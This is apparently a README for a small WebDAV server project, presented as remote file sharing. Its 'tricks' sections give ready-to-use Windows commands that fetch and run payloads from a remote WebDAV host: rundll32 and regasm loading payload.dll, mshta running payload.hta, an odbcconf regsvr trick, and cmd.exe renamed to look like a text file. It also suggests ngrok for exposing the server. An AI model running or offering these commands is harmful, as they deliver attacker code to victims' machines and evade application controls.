# Set Up WebDAV Server for Remote File Sharing
## Usage
Build:
```
chmod+x build.sh
.\build.sh
```
Start server:
```
chmod +x start.sh
.\start.sh 8080
```

## Example

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190822111539.png)

Just put the file in `share` folder.


![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190822112025.png)


## UNC PATH
```
\\server@port\folder
\\server@SSL@port\folder
```

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190822112343.png)


## Some tricks
```
\\server@port\folder\cmd.exe /c whoami
```
You can rename cmd.exe to any name you want, example:cmd.txt 

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190822112752.png)


## More?

```
rundll32 \\webdavserver\folder\payload.dll
mshta \\webdavserver\folder\payload.hta
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
...
```

## No VPS?

Try ngrok..
